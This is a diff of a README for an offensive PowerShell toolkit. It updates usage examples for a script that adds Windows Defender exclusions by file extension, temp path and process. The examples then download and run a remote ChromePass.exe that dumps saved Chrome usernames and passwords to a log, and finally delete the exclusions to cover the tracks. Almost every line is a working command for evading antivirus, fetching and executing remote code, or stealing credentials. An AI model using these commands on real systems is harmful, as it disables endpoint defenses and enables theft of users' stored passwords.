@@ -52,7 +52,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 |ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-ExclusionExtension.ps1 downloads\evade AV|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-bypass/Invoke-ExclusionExtension.ps1" -OutFile "Invoke-ExclusionExtension.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
 ```
 
 <br />
@@ -67,9 +67,22 @@ Get-Service -Name WinDefend
 ```
 
 ```powershell
-Get-help .\Invoke-ExclusionExtension.ps1 -Force
+Get-help .\Invoke-Exclusions.ps1 -Force
 
-.\Invoke-ExclusionExtension.ps1 -action "add" -Extension "exe" -Directory "$Env:TMP"
-.\Invoke-ExclusionExtension.ps1 -action "exec" -Extension "exe" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
-.\Invoke-ExclusionExtension.ps1 -action "del" -Extension "exe"
+#Set-MpPreference -ExclusionExtension "exe" -Force
+.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionExtension" -Exclude "exe"
+
+#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"
+
+#Set-MpPreference -ExclusionProcess "C:\Users\pedro\AppData\Local\Temp\Payload.exe" -Force
+.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
+
+
+#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
+
+#Remove-MpPreference -ExclusionProcess "$Env:TMP\Payload.exe" Force
+.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
+
 ```
